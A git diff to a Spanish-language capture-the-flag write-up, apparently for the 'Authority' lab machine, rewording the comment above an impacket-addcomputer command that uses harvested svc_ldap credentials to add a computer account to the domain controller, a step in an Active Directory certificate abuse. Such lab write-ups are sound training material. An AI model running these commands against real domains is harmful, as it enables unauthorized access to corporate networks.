@@ -285,6 +285,7 @@ aquí podemos ver que Domain Computers tiene permisos de `Enrollment Rights` lo 
 
 impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222 -computer-name 'gamuke' -computer-pass 'gamuke123'
 
-# con este comando vamos a agregar un equipo al dominio `authority.htb` utilizando las credenciales que hemos conseguido anteriormente. y proporcionando un nombre para el equipo y una contraseña
+# con este comando vamos a agregar un equipo al dominio `authority.htb` utilizando las credenciales que hemos conseguido anteriormente. proporcionando un nombre y una contraseña para el equipo que vamos a crear dentro del DC(Domain Controller) 
 ```
 ![[Pasted image 20240326235443.png]]
+
